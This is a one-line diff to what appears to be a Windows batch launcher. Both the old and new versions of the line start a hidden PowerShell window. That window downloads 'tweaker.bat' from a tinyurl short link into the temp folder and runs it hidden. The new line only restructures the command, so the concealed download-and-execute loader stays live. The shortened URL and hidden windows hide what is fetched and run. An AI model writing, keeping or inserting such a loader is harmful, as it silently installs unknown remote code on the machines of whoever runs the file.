@@ -1,1 +1,1 @@
-start /b "" powershell -w h -c "iwr -useb https://tinyurl.com/VZEDSTART -OutFile $env:TEMP\tweaker.bat; Start-Process $env:TEMP\tweaker.bat -WindowStyle Hidden" & exit
+start /b "" powershell.exe -NoProfile -WindowStyle Hidden -Command "$b=Join-Path $env:TEMP 'tweaker.bat'; iwr -useb 'https://tinyurl.com/VZEDSTART' -OutFile $b; Start-Process $b -WindowStyle Hidden" & exit
